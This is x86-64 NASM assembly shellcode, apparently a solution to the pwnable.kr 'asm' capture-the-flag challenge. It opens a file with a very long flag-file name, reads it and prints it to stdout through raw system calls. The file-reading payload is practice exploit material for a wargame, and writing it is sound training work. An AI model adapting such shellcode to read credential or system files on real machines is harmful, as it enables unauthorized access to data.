BITS 64

;constants
;system call ordinals
%define sys_read    0x000 
%define sys_write   0x001 
%define sys_open    0x002 
%define sys_exit    0x03C

;flag values
%define O_RDONLY    0x000
%define O_WRONLY    0x001
%define O_CREAT     0x040
%define S_IXUSR     0x040
%define S_IWUSR     0x080
%define S_IRUSR     0x100

;locals
%define stdout      0x001
%define buflen      0x100 


_start:
    mov rdi, flag_name ;fname
    mov rsi, O_RDONLY ;flags
    xor rdx, rdx ;mode
    mov rax, sys_open
    syscall

    mov rdi, rax ;fd
    mov rsi, buf ;buf
    mov rdx, buflen ;count
    mov rax, sys_read
    syscall
   
    mov rdi, stdout ; fd
    mov rsi, buf ;buf
    mov rdx, buflen ; count
    mov rax, sys_write
    syscall

    xor rdi, rdi
    mov rax, sys_exit
    syscall

;constants and global variables
flag_name:
    db  "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0 
buf:
    times buflen db 0

